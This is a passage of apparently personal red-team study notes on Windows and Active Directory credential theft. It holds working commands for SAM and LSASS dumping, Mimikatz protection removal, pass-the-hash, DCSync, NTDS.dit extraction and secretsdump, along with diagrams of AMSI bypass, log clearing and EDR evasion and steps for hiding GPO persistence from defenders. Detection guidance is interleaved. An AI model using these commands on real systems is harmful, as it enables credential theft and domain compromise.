**Disadvantages:**
- Generates security event logs
- Requires file transfer from target
- Only extracts local account hashes from SAM

**Detection Risk:** Medium (Event ID 4656 - registry hive access)

---

### Method 4: Mimikatz LSADUMP::SAM

**Requirements:** Administrator or SYSTEM privileges

Mimikatz can directly query the SAM database from the registry without creating files.

**Syntax:**
```cmd
mimikatz # privilege::debug
mimikatz # lsadump::sam
```

**Alternative (Specify SAM/SYSTEM Files):**
```cmd
mimikatz # lsadump::sam /sam:C:\\path\\to\\SAM /system:C:\\path\\to\\SYSTEM
```

**(See Appendix A: LSADUMP::SAM for complete parameter documentation and offline analysis options)**

---

### Cached Domain Credentials (HKLM\\SECURITY)

**Domain Cached Credentials (DCC)** are stored in the **SECURITY** registry hive to allow users to log on when Domain Controllers are unavailable.

**Location:** `HKLM\\SECURITY\\Cache`

**Format:** Domain Cached Credentials Version 2 (DCC2) - MS-CACHE v2 hash

**Extraction:**
```bash
python3 secretsdump.py -sam SAM-reg -system SYSTEM-reg -security SECURITY-reg LOCAL
```

**Output includes:**
```
[*] Dumping cached domain logon information (domain/username:hash)
DOMAIN\\User1:$DCC2$10240#User1#abc123...
```

**Cracking DCC2 Hashes:**
```bash
hashcat -m 2100 dcc2_hash.txt wordlist.txt
```

**Note:** DCC2 hashes cannot be used for Pass-the-Hash attacks (one-way hash). Must be cracked to obtain plaintext password.

---

### SAM Extraction Comparison

| Method | Speed | Stealth | Offline | Requires Meterpreter | Detection Risk |
|--------|-------|---------|---------|---------------------|----------------|
| Metasploit Hashdump | Fast | Low | No | Yes | High |
| Volume Shadow Copy | Medium | Medium | Yes | No | Medium |
| Registry Export | Fast | Medium | Yes | No | Medium |
| Mimikatz SAM | Fast | Low | Optional | No | High |

---

### Post-Extraction: Hash Cracking vs Pass-the-Hash

**Option 1: Crack Hashes (Hashcat/John)**
```bash
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```
- **Hash Type:** 1000 (NTLM)
- Recovers plaintext passwords
- Time-consuming for strong passwords

**Option 2: Pass-the-Hash Attack**
```bash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //target-ip cmd.exe
```
- Uses NTLM hash directly for authentication
- No password cracking required
- Works if NTLM authentication is enabled

**(See Pass-the-Hash section and Appendix A: SEKURLSA::Pth for complete PtH attack procedures)**

---

### Defense & Detection

**Blue Team Protections:**

1. **Restrict Administrator Access:**
   - Limit accounts with local admin privileges
   - Use LAPS for local admin password rotation

2. **Monitor Registry Access:**
   - Event ID 4656: Handle requested to registry key
   - Alert on HKLM\\SAM, HKLM\\SYSTEM access

3. **Disable Volume Shadow Copy (If Not Needed):**
   ```cmd
   vssadmin delete shadows /all
   sc config vss start= disabled
   ```

4. **Monitor Command Execution:**
   - Alert on `reg save`, `wmic shadowcopy`, `vssadmin`
   - Sysmon Event ID 1 (process creation)

5. **File Integrity Monitoring:**
   - Alert on SAM/SYSTEM/SECURITY file access
   - Monitor unusual file creation in user directories

**Detection Indicators:**
- Event ID 4656: SAM database access
- Event ID 4663: Registry key access attempts
- Event ID 8222: VSS shadow copy creation
- Unusual reg.exe, wmic.exe, vssadmin.exe execution
- SAM/SYSTEM files in user directories

---

### Defense Evasion Techniques in Active Directory

**Common evasion techniques used by attackers to bypass security controls:**

```mermaid
graph TB
    Start[Security Controls Encountered]
    Start --> DefenseType{Defense Mechanism}
    
    subgraph AMSI["AMSI (Anti-Malware Scan Interface) Bypass"]
        DefenseType -->|AMSI Scanning| AMSI1["PowerShell script scanning\nDetects malicious patterns"]
        AMSI1 --> AMSI2{Evasion Method}
        
        AMSI2 -->|Memory Patching| AMSI3["Patch amsi.dll in memory:\n[Ref].Assembly.GetType\nAmsiUtils.AmsiInitFailed = true"]
        AMSI2 -->|Obfuscation| AMSI4["String concatenation:\nI`E`X, Invoke-Expression\nBase64 encoding, XOR"]
        AMSI2 -->|Reflection| AMSI5["Use .NET reflection:\nBypass AMSI context\nDirect system calls"]
        AMSI2 -->|Alternative Execution| AMSI6["Use C#, VBScript, JScript\nRundll32, regsvr32\nAvoid PowerShell detection"]

        AMSI3 & AMSI4 & AMSI5 & AMSI6 --> AMSI_Result["PowerShell execution\nwithout AMSI scanning"]
    end
    
    subgraph ETW["ETW (Event Tracing for Windows) Evasion"]
        DefenseType -->|ETW Logging| ETW1["CLR ETW provider logs\n.NET and PowerShell activity"]
        ETW1 --> ETW2{Evasion Method}
        
        ETW2 -->|Provider Removal| ETW3["Unregister ETW provider:\n[Diagnostics.Tracing.EventProvider]\nRemove-EtwTraceProvider"]
        ETW2 -->|Patching| ETW4["Patch EtwEventWrite:\nModify ntdll.dll function\nin memory to return early"]
        ETW2 -->|Process Injection| ETW5["Inject into non-monitored process\nExecute from there\nAvoid instrumented processes"]

        ETW3 & ETW4 & ETW5 --> ETW_Result["Activity not logged\nto ETW traces"]
    end
    
    subgraph Logging["Event Log Evasion"]
        DefenseType -->|Event Logging| Log1["Security, System, Application logs\nRecord authentication, process creation"]
        Log1 --> Log2{Evasion Method}
        
        Log2 -->|Log Clearing| Log3["wevtutil cl Security\nClear-EventLog\nSuspicious but effective"]
        Log2 -->|Selective Deletion| Log4["Remove specific Event IDs:\n4624 logon, 4688 process\nUsing Remove-EventLog or wevtutil"]
        Log2 -->|Log Tampering| Log5["Modify log file directly:\nParse .evtx format\nRemove incriminating entries"]
        Log2 -->|Stealth Techniques| Log6["In-memory execution only:\nReflective DLL injection\nFileless malware\nLiving-off-the-land"]

        Log3 & Log4 & Log5 & Log6 --> Log_Result["Reduced forensic evidence\nHarder to detect actions"]
    end
    
    subgraph AV_EDR["AV/EDR Evasion"]
        DefenseType -->|Endpoint Protection| AV1["Signature-based detection\nBehavioral analysis\nHeuristics"]
        AV1 --> AV2{Evasion Method}
        
        AV2 -->|Obfuscation| AV3["String encoding:\nBase64, XOR, AES\nVariable renaming\nDead code insertion"]
        AV2 -->|Polymorphism| AV4["Change code structure:\nRecompile with variations\nDifferent encryption keys\nRandomized execution flow"]
        AV2 -->|LOLBins| AV5["Living-off-the-land binaries:\ncertutil, bitsadmin\nmshta, regsvr32\nTrusted signed binaries"]
        AV2 -->|Process Injection| AV6["Inject into legitimate process:\nexplorer.exe, svchost.exe\nDLL injection, Process hollowing\nAPC injection"]
        AV2 -->|Timing| AV7["Sleep before execution\nDelayed execution\nAvoid sandbox detection\nTime-based triggers"]

        AV3 & AV4 & AV5 & AV6 & AV7 --> AV_Result["Bypass AV/EDR detection\nExecute malicious code"]
    end
    
    subgraph AppControl["Application Control Bypass"]
        DefenseType -->|AppLocker/WDAC| AC1["Whitelist execution policy\nBlock unauthorized executables"]
        AC1 --> AC2{Evasion Method}
        
        AC2 -->|Trusted Folders| AC3["Write to allowed paths:\nC:\\Windows\\Tasks\nC:\\Windows\\Temp\nC:\\Windows\\tracing"]
        AC2 -->|Alternate Data Streams| AC4["Hide executable in ADS:\ntype payload.exe > file.txt:hidden.exe\nwmic process call create C:\\file.txt:hidden.exe"]
        AC2 -->|Scripting| AC5["Use allowed script interpreters:\nPowerShell, VBScript, JScript\nIf not explicitly blocked"]
        AC2 -->|DLL Side-Loading| AC6["Place malicious DLL\nnext to trusted executable\nDLL search order hijacking"]
        AC2 -->|Signed Binaries| AC7["Use Microsoft-signed binaries:\nmsbuild.exe, csc.exe\nregsvcs.exe, InstallUtil.exe"]

        AC3 & AC4 & AC5 & AC6 & AC7 --> AC_Result["Execute code despite\napplication control"]
    end
    
    subgraph Creds["Credential Guard Bypass"]
        DefenseType -->|Credential Guard| CG1["Hardware-based isolation\nProtects LSASS credentials\nVirtualization-based security"]
        CG1 --> CG2{Evasion Method}
        
        CG2 -->|Alternative Targets| CG3["Target unprotected sources:\nMemory of other processes\nSAM database, NTDS.dit\nLSA Secrets"]
        CG2 -->|Kerberos Attacks| CG4["Kerberoasting:\nService ticket extraction\nDoesn't require LSASS access\nOffline cracking"]
        CG2 -->|Ticket Theft| CG5["Steal Kerberos tickets:\nklist sessions\nRubeus dump /luid\nExport .kirbi files"]
        CG2 -->|Network Attacks| CG6["NTLM relay attacks\nPass-the-Hash over network\nDoesn't require local creds"]

        CG3 & CG4 & CG5 & CG6 --> CG_Result["Obtain credentials\nwithout Credential Guard bypass"]
    end
    
    AMSI_Result & ETW_Result & Log_Result --> Success[Evasion Successful]
    AV_Result & AC_Result & CG_Result --> Success
    
    Success --> Maintain[Maintain Stealth]
    
    Maintain --> M1["Avoid high-privilege operations\nwhen possible"]
    Maintain --> M2["Use encryption for C2 traffic\nDNS tunneling, HTTPS"]
    Maintain --> M3["Blend with normal traffic\nUse standard ports\nMimic legitimate processes"]
    Maintain --> M4["Clean up artifacts:\nDelete files, clear logs\nRemove scheduled tasks"]

    BlueNote["BLUE TEAM DETECTION:\nMonitor PowerShell ScriptBlock logging Despite AMSI bypass\nCollect ETW from multiple providers Redundant logging\nCentralize logs to SIEM Immediate forwarding prevents deletion\nFile Integrity Monitoring Alert on amsi.dll ntdll.dll modification\nBehavioral detection ML/AI for anomalies vs signatures"]

    BestPract["ATTACKER BEST PRACTICES:\nLayer evasion techniques AMSI + ETW + Obfuscation\nTest in isolated environment Verify evasion before operation\nUse custom tools Avoid public/signatured tools\nMinimize noise Targeted over broad scans"]
    
    style Success fill:#ff6666
    style Maintain fill:#ffcccc
```

*Figure: Comprehensive defense evasion techniques covering AMSI, ETW, logging, AV/EDR, application control, and Credential Guard with detection strategies*

---

## MEMORY-BASED CREDENTIAL EXTRACTION

**Date: 28/02/25**

### NOTES

Memory-based credential extraction targets credentials stored in Windows process memory, primarily focusing on LSASS (Local Security Authority Subsystem Service) which caches authentication credentials for Single Sign-On (SSO) functionality.

---

### LSASS Process Overview

**Local Security Authority Subsystem Service (LSASS)** is a critical Windows process responsible for:
- Enforcing the OS security policy
- Verifying user logons
- Handling password changes
- Creating access tokens
- Caching credentials for domain-authenticated users

**Why Target LSASS?**

Windows stores credentials in LSASS process memory to enable users to access network resources without re-entering credentials. This includes:
- **Plaintext passwords** (WDigest authentication - legacy systems)
- **NTLM hashes** (NT and LM hashes)
- **Kerberos tickets** (TGTs and TGSs)
- **Kerberos encryption keys** (AES256, AES128, DES)

**Critical Distinction: SAM vs LSASS**
- **SAM Database:** Stores local account password hashes on disk (static storage)
- **LSASS Memory:** Caches domain credentials in process memory (dynamic storage)

**LSASS Memory Extraction Decision Tree:**

```mermaid
graph TD
    Start{Need to extract<br/>credentials from LSASS}
    
    Start -->|GUI Access| Method1[Task Manager Method]
    Start -->|Command Line| Method2[ProcDump Method]
    Start -->|Mimikatz Available| Method3[Direct Memory Access]
    
    Method1 --> TM1[1. Open Task Manager]
    TM1 --> TM2[2. Find lsass.exe in Details]
    TM2 --> TM3[3. Right-click → Create Dump File]
    TM3 --> TM4[4. Transfer lsass.DMP to attacker]
    TM4 --> TM5[5. Offline: sekurlsa::minidump]
    TM5 --> Extract1[Credentials Extracted]
    
    Method2 --> PD1[1. Upload procdump.exe]
    PD1 --> PD2[2. procdump -ma lsass.exe dump.dmp]
    PD2 --> PD3[3. Transfer dump to attacker]
    PD3 --> PD4[4. Offline analysis with Mimikatz]
    PD4 --> Extract2[Credentials Extracted]
    
    Method3 --> M1[1. Run mimikatz as Admin]
    M1 --> M2[2. privilege::debug]
    M2 --> M3{LSA Protected?}
    M3 -->|Yes| M4[3. Load driver: !+]
    M4 --> M5[4. Disable protection:<br/>!processprotect /remove]
    M5 --> M6[5. sekurlsa::logonpasswords]
    M3 -->|No| M6
    M6 --> Extract3[Credentials Extracted<br/>Real-time]
    
    Extract1 --> Results[NTLM Hashes<br/>Plaintext Passwords<br/>Kerberos Tickets]
    Extract2 --> Results
    Extract3 --> Results
    
    style Method1 fill:#e6ffe6
    style Method2 fill:#ffe6e6
    style Method3 fill:#e6e6ff
    style Results fill:#ffffcc
```

*Figure: Three methods for extracting credentials from LSASS memory with varying stealth and complexity levels*

---

### LSASS Memory Dumping Methods

Multiple techniques exist to extract credentials from LSASS memory, each with different stealth and privilege requirements.

---

#### Method 1: Task Manager GUI (Interactive)

**Requirements:** Local Administrator privileges

**Steps:**
1. Open **Task Manager** (Ctrl+Shift+Esc or right-click taskbar)
2. Navigate to **Details** tab
3. Locate `lsass.exe` process
4. Right-click → Select **Create Dump File**
5. Task Manager creates dump file: `C:\Users\<Username>\AppData\Local\Temp\lsass.DMP`
6. Transfer dump file to attacker machine using SCP/SMB
7. Extract credentials offline using Mimikatz

**Offline Extraction:**
```cmd
mimikatz # sekurlsa::minidump lsass.DMP
mimikatz # sekurlsa::logonpasswords
```

**Detection Risk:** Medium (generates Event ID 1000, visible in Task Manager)

---

#### Method 2: Sysinternals ProcDump (Command Line)

**Requirements:** Local Administrator privileges

**Procdump Utility** from Sysinternals Suite enables memory dumping via command line:

```cmd
C:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

**Parameters:**
- `-accepteula` - Accept End User License Agreement
- `-ma` - Write a full dump file (all memory)
- `lsass.exe` - Target process
- Output path for dump file

**Advantages:**
- Scriptable/automatable
- Reliable and stable
- Officially signed Microsoft tool

**Disadvantages:**
- **High AV detection rate** (known credential theft tool)
- Creates large dump files (100-500 MB)
- Generates security event logs

**Offline Extraction:** Same as Method 1

**Detection Risk:** High (AV alerts, Event ID 10 - Sysmon, LSASS access logs)

---

#### Method 3: Mimikatz Direct Memory Access (Live)

**Requirements:**
- Local Administrator or SYSTEM privileges
- SeDebugPrivilege enabled

**Direct memory extraction** using Mimikatz without creating dump files:

**Step 1: Enable Debug Privileges**
```cmd
mimikatz # privilege::debug
```

Output: `Privilege '20' OK` (SeDebugPrivilege enabled)

**Step 2: Extract Credentials**
```cmd
mimikatz # sekurlsa::logonpasswords
```

**Output includes:**
- **Authentication packages:** MSV, Kerberos, WDigest, TSpkg, LiveSSP
- **Usernames** and **domains**
- **NTLM hashes**
- **SHA1 hashes**
- **Plaintext passwords** (if WDigest enabled)
- **Kerberos tickets**

**Additional SEKURLSA Commands:**
```cmd
mimikatz # sekurlsa::tickets        # Dump Kerberos tickets (TGT/TGS)
mimikatz # sekurlsa::ekeys          # Dump Kerberos encryption keys
mimikatz # sekurlsa::credman        # Dump Credential Manager creds
mimikatz # sekurlsa::krbtgt         # Extract krbtgt hash (Golden Ticket)
```

**(See Appendix A for complete SEKURLSA module documentation including Pth, Minidump, and all credential extraction commands)**

**Advantages:**
- No dump file creation (lower forensic footprint)
- Real-time credential access
- Multiple extraction options

**Disadvantages:**
- Requires Mimikatz binary on target (high AV detection)
- Leaves process injection artifacts
- Requires active session

**Detection Risk:** Very High (AV signatures, EDR behavioral detection, Event ID 10)

**Important Notes:**
- User credentials only cached after logon to the system
- Cached credentials persist until reboot or logoff
- Multiple user sessions = multiple credential sets

---

### LSA Protection Bypass

**Protected LSASS (RunAsPPL):**

Microsoft implemented LSA Protection to prevent non-protected processes from accessing LSASS memory.

**Check if LSA Protection is enabled:**
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

If `RunAsPPL = 1`, LSA Protection is **enabled**.

**Enable LSA Protection (Defender Method):**
1. Open Group Policy Editor: `gpedit.msc`
2. Navigate: Computer Configuration → Preferences → Windows Settings
3. Right-click Registry → New → Registry Item
4. Hive: `HKEY_LOCAL_MACHINE`
5. Key Path: `SYSTEM\CurrentControlSet\Control\Lsa`
6. Value Name: `RunAsPPL`
7. Value Type: `REG_DWORD`
8. Value Data: `00000001`

**Bypass LSA Protection with Mimikatz Driver:**

Mimikatz includes **mimidrv.sys** kernel driver to disable LSA protection at kernel level.

**Step 1: Load Mimikatz Driver**
```cmd
mimikatz # !+
```

Output: `[+] 'mimidrv' service started`

**Note:** If you receive error **"isFileExist (mimidrv.sys)"**, ensure mimidrv.sys is in same directory as mimikatz.exe, then exit and restart mimikatz.

**Step 2: Disable LSASS Protection**
```cmd
mimikatz # !processprotect /process:lsass.exe /remove
```

Output: `Process Protection removed for lsass.exe`

**Step 3: Extract Credentials**
```cmd
mimikatz # sekurlsa::logonpasswords
```

Successfully bypasses LSA Protection and dumps credentials.

**Requirements:**
- Kernel driver loading requires SYSTEM privileges
- Driver signing enforcement may need to be disabled
- Leaves kernel driver artifacts (detectable)

**(See Appendix A: PRIVILEGE::Debug for elevation requirements and protection bypass techniques)**

---

### Alternative LSASS Dumping Tools

**Comsvcs.dll Method (Native Windows DLL):**

Windows includes comsvcs.dll with built-in memory dumping capability:

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
```

Get LSASS PID:
```cmd
tasklist /fi "imagename eq lsass.exe"
```

**Advantages:**
- Native Windows tool (lower AV detection)
- No third-party tools required

**Disadvantages:**
- Still generates security events
- Requires Administrator privileges

**Detection Risk:** Medium (Event ID 10, unusual comsvcs.dll usage)

---

### Detection & Prevention

**Blue Team Defenses:**

1. **Credential Guard** (Windows 10+/Server 2016+):
   - Isolates LSASS in virtualized container
   - Prevents direct memory access
   - Blocks Mimikatz and similar tools

2. **Disable WDigest Authentication:**
   ```cmd
   reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
   ```
   Prevents plaintext password caching

3. **Monitor LSASS Access:**
   - Event ID 10 (Sysmon): Process access to lsass.exe
   - Event ID 4656: Handle requested to LSASS
   - Alert on procdump.exe, comsvcs.dll, Task Manager dumps

4. **Enable LSA Protection:**
   - Set RunAsPPL registry key
   - Requires signed drivers to access LSASS

5. **Restrict Debug Privileges:**
   - Limit SeDebugPrivilege to essential accounts
   - Monitor privilege usage (Event ID 4672)

6. **EDR/AV Signatures:**
   - Detect known credential dumping tools
   - Monitor for in-memory .NET assembly loading (PowerShell Mimikatz)

**Red Team Evasion:**
- Use obfuscated/recompiled Mimikatz variants
- Leverage living-off-the-land binaries (comsvcs.dll)
- Dump LSASS remotely via PsExec/WMI
- Use direct system calls to bypass API hooks

---

## LOCAL ADMINISTRATOR PASSWORD SOLUTION (LAPS) & GROUP POLICY PREFERENCES (GPP)

**Date: 29/02/25**

### NOTES

---

### GROUP POLICY PREFERENCES (GPP)

Microsoft Implemented a method to change Local administrator account across workstations using GPP.

GPP is a tool that allows administrators to create Domain policies with embedded Credentials.

Once the GPP is deployed, XML files are created in the **SYSVOL** folder (Shares AD NTFS Volume) meaning any Domain user can read the content of the SYSVOL folder.

It became easy to decrypt the stored passwords.

One of the tools to crack the SYSVOL encrypted password is **Get-GPPPassword**.

Microsoft removed storing the encrypted password in the Sysvol folder; it then Introduced the **LAPS** offering a more secure solution approach to remotely managing the Local Administrator password.

This new method includes 2 new attributes:
- `ms-mcs-AdmPwd`
- `ms-mcs-AdmPwdExpirationTime`

---

### LAPS

**LAPS** uses `admpwd.dll` (many) to change the local Admin password & update the value of `ms-mcs-AdmPwd`.

To check if LAPS is enabled on a system, we enumerate with:

```cmd
dir "C:\Program Files\LAPS\CSE"
```

If `Admpwd.dll` exists in the directory, it means LAPS is enabled.

---

### Find PowerShell cmdlets available for Admpwd:

```powershell
Get-Command *AdmPwd*
```

Find which AD Organizational Unit (OU) has the "All Extended Rights" attribute that deals with LAPS:

Use `Find-AdmPwdExtendedRights` Cmdlet to provide the right OU; use `-Identity` flag option.

The Output of the above step shows the Security Group in the Organizational Unit that has the right to access LAPS.

---

### Check the Group members:

```cmd
net groups "<Group Name>"
net user <Username>
```

To find the LAPS password, we need to Compromise/Impersonate a particular User. After we get the LAPS password, use `Get-AdmPwdPassword` cmdlet by providing the target machine with LAPS enabled:

```powershell
Get-AdmPwdPassword -ComputerName <Creds-harvestingPC>
```

In Real world Environment, LAPS is enabled on specific machines only, thus we need to enumerate & find the target computer as well as the right User account to be able to get LAPS password.

---

### LAPS TOOLKIT

PowerShell Script can do this [Functions written in PowerShell that leverage PowerView to audit & attack AD Environments that have deployed LAPS]:

**Get-LapsComputers** - Displays all Computers with LAPS enabled, Password Expiration, & password if user has access.

**Find-LapsDelegatedGroups** - Searches all OUs to see which AD groups can read the `ms-mcs-AdmPwd` attribute.

**Find-AdmPwdExtendedRights** - Parses the Extended Rights for each AD Computer with LAPS enabled & looks for which group has read access & if any user has "All extended Rights".

---

## NTDS.dit Domain Controller Database

**Date: 03/03/25**

```
C:\Windows\NTDS\NTDS.dit
```

### NOTES

**NTDS** Domain Controller is a database containing all Active Directory Data, Objects, Attributes, Credentials.

**Tables:**
- **Schema Tables:** Object Types & Relationship
- **Link Tables:** Object's Attributes & their Values
- **Data Table:** User & Groups

NTDS is always locked while running/active, however there are other ways to Copy & dump its contents (including SAM file too).

**NB:** NTDS file requires a system Boot key to attempt to decrypt Isolated Credentials → stored in **SECURITY** file.

---

### NTDSUTIL

`C:\Windows\NTDS\NTDS.dit`

**NTDSUTIL** is a windows utility used to manage Active Directory configuration.

Used in the following scenarios:
- Restore Deleted Objects in Active Directory
- Perform Management of Active Directory snapshot
- Perform Maintenance for AD Database
- Set Directory Services Restore Mode (DSRM) admin password

---

### 1.) LOCAL Dumping

Usually done if you have no credentials available but admin access to the domain Controller.

To Successfully dump the content of NTDS file we need:

```
C:\Windows\system32\Config\SYSTEM
C:\Windows\system32\Config\SECURITY
```

To Dump the Contents of NTDS file using the **NTDSUTIL** tool via a powerful one-liner PowerShell command:

```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Check `c:\temp` for **AD** & **Registry** folders Containing:
- `NTDS.dit`
- `SYSTEM`
- `SECURITY` file we need

Transfer them to AttackBox and run **Impacket** (`secretsdump.py`) to extract the hashes from the dumped memory file:

```bash
python3 secretsdump.py -ntds <filepath> -system <filepath> -security <filepath> LOCAL
```

---

### 2.) Remote Dumping

Requires Credentials & password/NTLM Hashes of Users with Administrative access to a DC.

**DCSync Attack** is a popular attack to perform within an AD environment to dump Credentials remotely.

This attack works when an account (Special Account with necessary permissions) or AD account is compromised that has the following AD permissions:
- **Replicating Directory Changes**
- **Replicating Directory Changes ALL**
- **Replicating Directory Changes in Filtered Set**

An adversary takes advantage of these Configurations to perform a Domain Controller Synchronization Attack.

#### Mimikatz LSADUMP::DCSync Command

The `lsadump::dcsync` module impersonates a Domain Controller to request password data via Directory Replication Service (DRS) protocol.

**Basic Syntax:**
```cmd
mimikatz # lsadump::dcsync /domain:<domain> /user:<user or all>
```

**Key Options:**
- `/all` – DCSync pull data for the entire domain
- `/user` – User ID or SID to target
- `/domain` – FQDN of target domain (optional, defaults to current)
- `/csv` – Export results to CSV format
- `/dc` – Specify target Domain Controller

**Requirements:** Domain Admin, Enterprise Admin, or custom delegation rights (Replicating Directory Changes + Replicating Directory Changes ALL)

**(See Appendix A for complete DCSync implementation details, DRS protocol explanation, and advanced parameters)**

**DCSync Attack Flow:**

```mermaid
sequenceDiagram
    participant A as Attacker<br/>(Compromised Account)
    participant DC1 as Target DC
    participant DC2 as Legitimate DC
    
    Note over A,DC2: Prerequisites: Account with replication rights<br/>(Domain Admin, Enterprise Admin, or DCSync permissions)
    
    rect rgb(255, 200, 200)
        Note over A,DC1: Normal DC Replication (for context)
        DC2->>DC1: DRS Request (Legitimate)
        DC1->>DC2: Replicate: NTDS.dit objects<br/>Including password hashes
    end
    
    rect rgb(200, 255, 200)
        Note over A,DC1: DCSync Attack
        A->>DC1: 1. DRS GetNCChanges Request<br/>Impersonates Domain Controller
        Note over DC1: DC believes request<br/>is from another DC
        DC1->>A: 2. DRS Response: Credential dump<br/>krbtgt hash, user hashes, etc.
    end
    
    Note over A: 3. No authentication to DC required<br/>No LSASS access needed<br/>Leaves minimal forensic evidence
    
    A->>A: 4. Use credentials for:<br/>• Golden Tickets<br/>• Pass-the-Hash<br/>• Privilege escalation
```

*Figure: DCSync attack exploits Directory Replication Service (DRS) protocol to dump credentials without touching LSASS*

---

### Previously in Persisting AD

We showed how to use mimikatz:

```
lsadump::dcsync /domain:<domain> /user:<user or all>
```

To carry out Credential Dump.

---

### Here we will Try to Use Impacket secretsdump Script inside our Attack Box

With user with sufficient privileges:

```bash
python3 secretsdump.py -just-dc <Domain>/<User>:<Password>@<DC IP>
```

**Flags:**
- `-just-dc` - Extract NTDS Data & Kerberos
- `-just-dc-ntlm` - Extract NTLM Hash only

---

### Once we obtained Hashes

We can either use the hash for a specific user to Impersonate them via **PTH** OR Crack the hash using **Hashcat** and a password Wordlist to Compare Transformed hashes:

```bash
hashcat -m 1000 -a 0 hashes.txt wordlist/rockyou.txt
```

---

## CONT: NOTES

**Date: 04/03/25**

### Hiding in Plain Sight

We want to ensure the Blue Team can't Simply Remove our persistence.

---

### Steps:

1. Open MMC Window
2. Click on your policy
3. Click on Delegation
4. Remove unwanted groups/permissions

Let's Remove Administrators ability to edit GPOs, likewise Remove Administrator ability to Read our Policy:

- Right click on **Enterprise Domain Controllers**
- Select **Edit settings, delete, modify security**
- Click on all other groups (except authenticated Users)
- Click **Remove**
- Click on **Advanced** & Remove the Created Owner from the permissions

We could Replace **Authenticated Users** with **Domain Computers** to ensure that Computers Can Read & apply our policy.

---

### NB: Do not wait Until full domain Compromise to deploy persistence

Persistence should be deployed after each round of Lateral Movement & Privilege Escalation.

---

### Other persistence Techniques:

- Skeleton keys
- Computer Accounts & Directory Service Restore Mode
- Malicious Security Support Provider (SSP)

Also note that several local persistence techniques can also allow for persistence on hosts, & if the hosts are domain-Joined, it will allow for persistence in Active Directory as well.

---

## MITIGATIONS

- Anomalous Account logon events are the most common alert for persistence
- Anytime Credentials break the Tier Model, it can be a Result of Persistence
- For each of the persistence techniques, specific detection scripts can be written
- Best defence is to protect privileged Resources like protected Security Groups & User Accounts

---

### Local User Accounts vs Domain User Accounts

**Local User Account:**
- Details stored locally within the Windows file system
- **SAM**

**Domain User Accounts:**
- Details stored in centralized Active Directory
- **NTDS/KDC**

---

## APPENDIX A: MIMIKATZ COMMAND REFERENCE

**Active Directory Attack Lifecycle Overview:**

```mermaid
graph TB
    Start[External Reconnaissance]
    Start --> Recon[Passive Information Gathering]
    
    Recon --> R1[OSINT:<br/>LinkedIn for usernames<br/>Dehashed for breaches<br/>DNS enumeration]
    Recon --> R2[Public Infrastructure:<br/>Email format discovery<br/>Subdomain enumeration<br/>SSL certificate analysis]
    
    R1 & R2 --> Initial[Initial Access]
    
    subgraph Phase1["Phase 1: Initial Access"]
        Initial --> I1{Access Method}
        
        I1 -->|Phishing| I2[Credential harvesting<br/>Malicious attachments<br/>Drive-by downloads]
        I1 -->|Password Spraying| I3[Username enumeration<br/>Common password testing<br/>Policy-aware spraying]
        I1 -->|External Services| I4[VPN exploitation<br/>Web application vulns<br/>Exposed RDP/SMB]
        I1 -->|NTLM Relay| I5[LLMNR/NBT-NS poisoning<br/>Relay to SMB/HTTP<br/>Coercion attacks]
        
        I2 & I3 & I4 & I5 --> Access[Domain User Access]
    end
    
    Access --> Enum[Enumeration & Discovery]
    
    subgraph Phase2["Phase 2: Enumeration"]
        Enum --> E1[Domain Mapping:<br/>BloodHound collection<br/>LDAP queries<br/>SMB share enumeration]
        Enum --> E2[User Discovery:<br/>Kerberoastable accounts<br/>AS-REP roastable users<br/>High-value targets]
        Enum --> E3[System Discovery:<br/>Unconstrained delegation<br/>LAPS deployment<br/>Certificate templates]
        Enum --> E4[Privilege Mapping:<br/>ACL relationships<br/>Group memberships<br/>Local admin rights]
        
        E1 & E2 & E3 & E4 --> Attack[Attack Path Identified]
    end
    
    Attack --> Exploit[Exploitation]
    
    subgraph Phase3["Phase 3: Exploitation"]
        Exploit --> Ex1{Attack Vector}
        
        Ex1 -->|Kerberoasting| Ex2[Request TGS tickets<br/>Offline hash cracking<br/>Service account compromise]
        Ex1 -->|AS-REP Roasting| Ex3[Request AS-REP without preauth<br/>Crack user passwords<br/>Account takeover]
        Ex1 -->|Delegation Abuse| Ex4[Unconstrained: Force auth<br/>Constrained: S4U abuse<br/>RBCD: Computer takeover]
        Ex1 -->|Certificate Abuse| Ex5[ESC1-ESC8 exploitation<br/>Certificate forgery<br/>Admin authentication]
        Ex1 -->|ACL Abuse| Ex6[GenericAll/WriteDACL<br/>Password reset<br/>Group membership mods]
        
        Ex2 & Ex3 & Ex4 & Ex5 & Ex6 --> Priv[Privileged Access]
    end
    
    Priv --> Lateral[Lateral Movement]
    
    subgraph Phase4["Phase 4: Lateral Movement"]
        Lateral --> L1{Movement Method}
        
        L1 -->|PSExec| L2[Service creation<br/>ADMIN$ share upload<br/>Remote execution]
        L1 -->|WMI| L3[Win32_Process invoke<br/>Scheduled tasks<br/>Stealth execution]
        L1 -->|WinRM| L4[PowerShell remoting<br/>Interactive sessions<br/>Encrypted channel]
        L1 -->|RDP| L5[GUI access<br/>Restricted admin mode<br/>Pass-the-Hash RDP]
        L1 -->|Pass-the-Ticket| L6[TGT injection<br/>Service ticket reuse<br/>Cross-host movement]
        
        L2 & L3 & L4 & L5 & L6 --> Spread[Multiple Systems Compromised]
    end
    
    Spread --> Escalate[Privilege Escalation]
    
    subgraph Phase5["Phase 5: Privilege Escalation"]
        Escalate --> Esc1{Escalation Path}
        
        Esc1 -->|Credential Dumping| Esc2[LSASS memory dump<br/>SAM extraction<br/>DCSync attack]
        Esc1 -->|Ticket Forging| Esc3[Golden Ticket creation<br/>Silver Ticket forging<br/>Diamond Ticket crafting]
        Esc1 -->|GPO Abuse| Esc4[Modify existing GPO<br/>Create malicious policy<br/>Domain-wide deployment]
        Esc1 -->|Certificate Forging| Esc5[Template exploitation<br/>CA key theft<br/>Admin cert creation]
        
        Esc2 & Esc3 & Esc4 & Esc5 --> DA[Domain Admin Access]
    end
    
    DA --> Persist[Persistence]
    
    subgraph Phase6["Phase 6: Persistence"]
